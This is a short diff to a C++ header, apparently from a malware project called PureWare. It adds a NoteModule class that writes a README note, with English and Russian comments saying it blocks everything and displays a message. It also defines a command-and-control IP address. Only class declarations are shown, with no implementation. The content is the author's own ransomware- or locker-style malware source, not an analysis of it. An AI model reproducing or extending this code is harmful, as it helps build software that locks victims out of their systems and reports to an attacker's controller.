@@ -21,6 +21,18 @@ private:
 
 };
 
+// Block everything and create a desktop shity note // Надо дописать так, чтобы можно было кастомить
+class NoteModule
+{
+    std::wstring Note_that_would_be_set_in_file;
+
+    void Create_README_file(std::filesystem::path README_path);
+public:
+    NoteModule();
+    NoteModule(std::wstring Note_that_would_be_set_in_file);
+    void MakeSomeShit(); // Блокает к херам всё и выводит надпись
+};
+
 #define C2_IP_ADDRESS "192.168.255.254"
 
 #endif // PUREWARE_PUREWARE_HPP_
